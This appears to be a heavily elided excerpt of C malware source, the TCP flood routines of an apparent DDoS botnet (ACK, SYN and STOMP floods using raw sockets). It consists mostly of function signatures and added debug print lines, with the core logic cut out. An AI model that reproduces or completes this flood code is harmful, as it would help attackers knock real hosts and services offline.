...
#ifdef DEBUG
        printf("[attack_tcp]attack_tcp_syn statrt\n");
#endif
...
void attack_tcp_ack(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    ...
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
#ifdef DEBUG
        printf("[attack_tcp]attack_tcp_ack statrt\n");
#endif
    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
...
void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
...
#ifdef DEBUG
        printf("[attack_tcp]attack_tcp_stomp statrt\n");
#endif
    ...
    for (i = 0; i < targs_len; i++)
    {
...
#ifdef DEBUG
        printf("[attack_tcp]attack_tcp_stomp370:errno=%d\t  addrport=%d   addraddr=%d\n",errno,addr.sin_port,addr.sin_addr);
        //addr.sin_port=62623;
#endif
        ...
        printf("[attack_tcp]attack_tcp_stomp while statrt0\n");
            ...
            {
#ifdef DEBUG
        printf("[attack_tcp]attack_tcp_stomp while1 \n");
#endif
                ...
                {
#ifdef DEBUG
        printf("[attack_tcp]attack_tcp_stomp while2 \n");
#endif
                    if (tcph->syn && tcph->ack)
                    {
#ifdef DEBUG
        printf("[attack_tcp]attack_tcp_stomp while3 \n");
#endif
                        struct iphdr *iph;
                        struct tcphdr *tcph;
                        char *payload;
                        ...
                        rand_str(payload, data_len);
#ifdef DEBUG
        printf("[attack_tcp]attack_tcp_stomp while break\n");
#endif
                        break;
                    }
                    ...
                    {
#ifdef DEBUG
        printf("[attack_tcp]attack_tcp_stomp goto stomp_setup_nums\n");
#endif
                        close(fd);
...
#ifdef DEBUG
        printf("[attack_tcp]attack_tcp_stomp statrt2\n");
#endif
